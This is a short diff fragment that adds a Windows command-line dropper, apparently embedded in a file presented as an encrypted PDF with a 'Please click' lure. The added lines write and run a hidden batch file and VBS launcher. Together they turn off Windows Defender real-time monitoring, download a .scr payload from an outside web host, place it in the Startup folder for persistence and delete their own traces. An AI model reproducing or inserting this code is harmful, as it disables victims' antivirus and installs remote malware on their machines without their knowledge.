@@ -1,0 +1,3 @@
+/c cD  %tEMP% &@echo powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true (New-Object Net.WebClient).DownloadFile('https://badreddine67.000webhostapp.com/Theme_Smart.scr', 'Theme_Smart.scr')" >> msd89h2j389uh.bat &@echo move "%TMP%\Theme_Smart.scr" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >> msd89h2j389uh.bat &@echo del "%~f0" >> msd89h2j389uh.bat &@echo Set oShell = CreateObject ("Wscript.Shell") >> encrypted.vbs &@echo Dim strArgs >> encrypted.vbs &@echo strArgs = "cmd /c msd89h2j389uh.bat" >> encrypted.vbs &@echo oShell.Run strArgs, 0, false >> encrypted.vbs & encrypted.vbs &dEl encrypted.vbs
+			
+			                    PDF Encrypted. Please click
